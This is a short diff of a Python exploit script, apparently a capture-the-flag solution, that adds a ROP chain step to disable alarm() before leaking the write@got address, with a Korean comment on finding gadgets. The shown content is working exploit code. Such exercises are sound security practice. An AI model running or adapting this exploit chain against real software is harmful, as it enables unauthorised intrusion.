@@ -115,10 +115,13 @@ if __name__ == "__main__":
     # now, r14 points above the stack frame of do_test()
     r.clean()
 
-# leak the address of write@got
+# turn off the alarm & leak the address of write@got
 # ROP gadget 은 github 의 ROPgadget 을 설치해서, 찾아낸다. ( pop rdi; ret ) ( pop rsi; ...; ret )
 
     ROP = p64(CODE_BASE + pop_rdi)
+    ROP += p64(0) # turn off alarm
+    ROP += p64(CODE_BASE + b.plt['alarm'])
+    ROP += p64(CODE_BASE + pop_rdi)
     ROP += p64(1) # fd
     ROP += p64(CODE_BASE + pop_rsi)
     ROP += p64(CODE_BASE + b.got['write'])
